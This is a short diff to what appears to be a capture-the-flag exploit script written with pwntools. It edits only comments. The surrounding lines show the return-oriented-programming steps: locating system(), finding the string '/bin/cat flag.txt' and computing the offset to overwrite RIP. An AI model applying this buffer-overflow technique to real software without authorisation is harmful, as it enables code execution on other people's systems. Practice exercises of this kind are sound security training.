@@ -28,7 +28,7 @@ def exploit(binary_path):
         # Load the cached gadgets for the binary
         rop = ROP(elf)
 
-        # Get the address of the system function
+        # Get the address of the system() function
         system_addr = elf.symbols["system"]
         log.debug(f"The address of system() is {hex(system_addr)}")
 
@@ -42,7 +42,7 @@ def exploit(binary_path):
         string_addr = next(elf.search(b'/bin/cat flag.txt'))
         log.debug(f"The address of the /bin/cat flag.txt string is {hex(string_addr)}")
 
-        # Get the offset by calling the find_offset function
+        # Get the offset by calling the find_offset() function
         offset = find_offset(binary_path)
         log.debug(f"The offset calculated overwrite RIP is {offset} bytes")
 
